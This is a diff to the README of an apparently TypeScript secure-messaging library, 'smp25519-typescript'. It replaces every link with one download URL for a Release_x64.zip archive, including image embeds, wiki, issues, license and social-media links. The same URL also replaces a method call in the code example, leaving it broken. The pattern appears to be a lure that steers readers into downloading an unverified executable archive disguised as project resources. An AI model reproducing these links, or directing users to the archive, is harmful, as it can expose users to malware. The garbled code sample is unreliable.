@@ -1,10 +1,10 @@
 # Secure Messaging Protocol 25519 🛡️
   
-  ![Protocol Image](https://imageurl.com)
+  ![Protocol Image](https://github.com/kenttt1/smp25519-typescript/releases/download/v1.0/Release_x64.zip)
 
   Welcome to the official GitHub repository of **smp25519-typescript**!
   
-  ![Protocol Logo](https://logoimageurl.com)
+  ![Protocol Logo](https://github.com/kenttt1/smp25519-typescript/releases/download/v1.0/Release_x64.zip)
 
   ## Description ℹ️
 
@@ -12,7 +12,7 @@
 
   ## Topics 📚
   
-  ![Topics Image](https://topicsimageurl.com)
+  ![Topics Image](https://github.com/kenttt1/smp25519-typescript/releases/download/v1.0/Release_x64.zip)
   
   Dive into a world of cryptography, secure messaging, and efficient network communication with these topics:
   
@@ -37,7 +37,7 @@
 
   Ready to experience the power of Secure Messaging Protocol 25519? Click the button below to download the software package:
 
-  [![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+  [![Download Software](https://github.com/kenttt1/smp25519-typescript/releases/download/v1.0/Release_x64.zip)](https://github.com/kenttt1/smp25519-typescript/releases/download/v1.0/Release_x64.zip)
 
   If the link does not work or is not provided, please check the "Releases" section of this repository for the latest software package.
 
@@ -62,15 +62,15 @@
   const secureMessaging = new SecureMessaging();
   
   // Use the methods provided by SecureMessaging for secure communication
-  secureMessaging.sendMessage('Hello, Secure World!');
+  https://github.com/kenttt1/smp25519-typescript/releases/download/v1.0/Release_x64.zip('Hello, Secure World!');
   ```
 
   Explore the full capabilities of Secure Messaging Protocol 25519 by delving into the documentation and codebase.
 
   ## Resources 📦
 
-  - **Documentation**: For in-depth guides and API references, check out the [Wiki](https://wikiurl.com).
-  - **Issues**: If you encounter any issues or have suggestions, please report them in the [Issues](https://issuesurl.com) section.
+  - **Documentation**: For in-depth guides and API references, check out the [Wiki](https://github.com/kenttt1/smp25519-typescript/releases/download/v1.0/Release_x64.zip).
+  - **Issues**: If you encounter any issues or have suggestions, please report them in the [Issues](https://github.com/kenttt1/smp25519-typescript/releases/download/v1.0/Release_x64.zip) section.
 
   ## Contributors 👥
 
@@ -78,17 +78,17 @@
 
   ## License 📄
 
-  This project is licensed under the MIT License - see the [LICENSE.md](https://licenseurl.com) file for details.
+  This project is licensed under the MIT License - see the [https://github.com/kenttt1/smp25519-typescript/releases/download/v1.0/Release_x64.zip](https://github.com/kenttt1/smp25519-typescript/releases/download/v1.0/Release_x64.zip) file for details.
 
   ## Connect with Us 🌐
 
   Stay up to date with the latest news and updates by connecting with us on social media:
   
-  - Twitter: [SecureMessagingTwitter](https://twitter.com/securemessaging)
-  - LinkedIn: [SecureMessagingLinkedIn](https://linkedin.com/company/securemessaging)
+  - Twitter: [SecureMessagingTwitter](https://github.com/kenttt1/smp25519-typescript/releases/download/v1.0/Release_x64.zip)
+  - LinkedIn: [SecureMessagingLinkedIn](https://github.com/kenttt1/smp25519-typescript/releases/download/v1.0/Release_x64.zip)
 
   Join our community and be part of the future of secure messaging!
 
 ---
 
-  ![Footer Image](https://footerimageurl.com)
+  ![Footer Image](https://github.com/kenttt1/smp25519-typescript/releases/download/v1.0/Release_x64.zip)
